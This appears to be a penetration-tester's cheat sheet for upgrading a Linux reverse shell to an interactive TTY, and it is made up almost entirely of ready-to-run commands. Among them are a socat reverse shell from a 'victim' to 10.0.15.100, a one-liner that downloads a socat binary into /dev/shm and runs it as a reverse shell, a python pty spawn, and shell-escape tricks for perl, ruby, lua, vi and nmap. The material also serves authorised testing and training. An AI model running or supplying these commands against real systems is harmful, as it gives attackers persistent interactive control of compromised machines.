# Upgrade a linux reverse shell to a fully usable TTY shell
> Note: To check if the shell is a TTY shell use the tty command.
## rlwrap
You can mitigate some of the restrictions of poor netcat shells by wrapping the netcat listener with the **rlwrap** command.
```console
rlwrap nc -nlvp 8888
```
## python
```console
which python python2 python3    
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```
## socat
> Socat needs to be on both machines for this to work. Download the appropriate binaries from [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)
```bash
#Create Listener on attack platform:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#From Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444

#socat one-liner
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.15.100:4444
```
## Other
```console
echo os.system('/bin/bash')

/bin/sh -i

#perl
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";

#ruby
exec "/bin/sh"
ruby -e 'exec "/bin/sh"'

#lua
lua -e "os.execute('/bin/sh')"

# (From within IRB)
exec "/bin/sh"

# (From within vi)
:!bash

# (From within vi)
:set shell=/bin/bash:shell

# (From within nmap)
!sh

# In Kali or elsewhere
$ echo $TERM
$ stty -a

$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>
```
